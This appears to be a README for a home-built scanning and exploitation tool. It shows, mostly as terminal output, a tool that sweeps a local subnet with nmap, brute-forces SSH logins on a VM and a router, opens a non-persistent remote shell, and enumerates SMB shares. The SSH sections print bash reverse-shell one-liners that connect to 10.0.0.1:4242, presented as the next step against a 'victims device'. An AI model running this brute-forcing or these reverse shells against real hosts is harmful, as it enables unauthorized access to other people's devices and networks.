# Scanner (Vulnerability Detection and Exploitation)

It currently works with three services SSH, SMB and FTP. It initially scans ports to detect which are open and the services running on them. Then, it takes user's input to determine which service to interact with. 

# Nmap ping sweep
Active devices in the local subnet: 
```bash
┌─[babayaga@babayaga-virtualbox]─[~]
└──╼ $sudo nmap 192.168.1.1-15 -T5 -sn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-04 12:52 IST
Nmap scan report for dsldevice.lan (192.168.1.1)
Host is up (0.0026s latency).
MAC Address: 78:17:35:1B:FE:A0 (Nokia Shanghai Bell)
Nmap scan report for 192.168.1.3
Host is up (0.067s latency).
MAC Address: D0:AB:D5:C7:AC:54 (Intel Corporate)
Nmap scan report for 192.168.1.4
Host is up (0.086s latency).
MAC Address: 90:78:B2:C1:D8:43 (Xiaomi Communications)
Nmap scan report for 192.168.1.5
Host is up (0.067s latency).
MAC Address: D0:AB:D5:C7:AC:54 (Intel Corporate)
Nmap scan report for 192.168.1.6
Host is up (0.069s latency).
MAC Address: 18:BB:26:F1:00:5A (Fn-link Technology Limited)
Nmap scan report for 192.168.1.8
Host is up (0.17s latency).
MAC Address: E4:E7:49:D8:FA:EF (Hewlett Packard)
Nmap scan report for 192.168.1.13
Host is up (0.32s latency).
MAC Address: 9C:28:F7:E1:7F:1E (Xiaomi Communications)
Nmap scan report for 192.168.1.2
Host is up.
Nmap done: 15 IP addresses (8 hosts up) scanned in 5.87 seconds
```
## SSH
VM running SSH server:
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/DRDOdump]
└──╼ $sudo python3 main.py -uL userlist -uP passlist  -u 192.168.1.3
usage: SCANNER [-h] [-u IP_ADDRESS] [-p PORT] [-uL USERNAME LIST] [-uP PASSWORD LIST]

This script scans ports to detect active services and subsequently exploits them.

optional arguments:
  -h, --help         show this help message and exit
  -u IP_ADDRESS      ip address
  -p PORT            port value
  -uL USERNAME LIST  path to file containing usernames
  -uP PASSWORD LIST  path to file containing passwords

> SCANNING STARTED

Progress : 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 10/10 [00:02<00:00,  4.82it/s]

> SCANNING COMPLETED

> RESULTS:
   Port       Service
0    21           ftp
1    22           ssh
2    80          http
3   139   netbios-ssn
4   445  microsoft-ds

Enter the active services to be exploited: ssh
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

[SUCCESS] ==> Username: babayaga ==> Password: babayaga12

A reverse shell can be obtained by starting a netcat listener on your device and uploading a reverse shell to victims device.
Example: 
    > bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
    > 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
    > /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
            

A non persistent shell (-1 to exit): 

$ whoami
['babayaga\n']

$ id
['uid=1000(babayaga) gid=1001(babayaga) groups=1001(babayaga),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),120(bluetooth),132(lpadmin),138(scanner),1000(docker)\n']

$ -1

[SUCCESS]
```

Bruteforcing SSH credentials to a router:
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/DRDOdump]
└──╼ $sudo python3 main.py -u 192.168.1.1 -uL userlist -uP passlist 
[sudo] password for babayaga: 
usage: SCANNER [-h] [-u IP_ADDRESS] [-p PORT] [-uL USERNAME LIST] [-uP PASSWORD LIST]

This script scans ports to detect active services and subsequently exploits them.

optional arguments:
  -h, --help         show this help message and exit
  -u IP_ADDRESS      ip address
  -p PORT            port value
  -uL USERNAME LIST  path to file containing usernames
  -uP PASSWORD LIST  path to file containing passwords

> SCANNING STARTED

Progress : 100%|██████████████████████████████████████████████████████████████████████████████| 10/10 [00:02<00:00,  4.85it/s]

> SCANNING COMPLETED

> RESULTS:
   Port Service
0    22     ssh
1    23  telnet
2    80    http
3   443   https

Enter the active services to be exploited: ssh
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

[SUCCESS] ==> Username: admin ==> Password: admin

A reverse shell can be obtained by starting a netcat listener on your device and uploading a reverse shell to victims device.
Example: 
    > bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
    > 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
    > /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
            

A non persistent shell (-1 to exit): 

$ help
```

## SMB
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/DRDOdump]
└──╼ $sudo python3 main.py -uL userlist -uP passlist  -u 192.168.1.3
usage: SCANNER [-h] [-u IP_ADDRESS] [-p PORT] [-uL USERNAME LIST] [-uP PASSWORD LIST]

This script scans ports to detect active services and subsequently exploits them.

optional arguments:
  -h, --help         show this help message and exit
  -u IP_ADDRESS      ip address
  -p PORT            port value
  -uL USERNAME LIST  path to file containing usernames
  -uP PASSWORD LIST  path to file containing passwords

> SCANNING STARTED

Progress : 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 10/10 [00:02<00:00,  4.84it/s]

> SCANNING COMPLETED

> RESULTS:
   Port       Service
0    21           ftp
1    22           ssh
2    80          http
3   139   netbios-ssn
4   445  microsoft-ds

Enter the active services to be exploited: microsoft-ds


Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]

> CHECKING FOR ANONYMOUS LOGIN AND ANY SHARES WE CAN ACCESS

Enter workgroup(default WORKGROUP): 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
SMB1 disabled -- no workgroup available
```
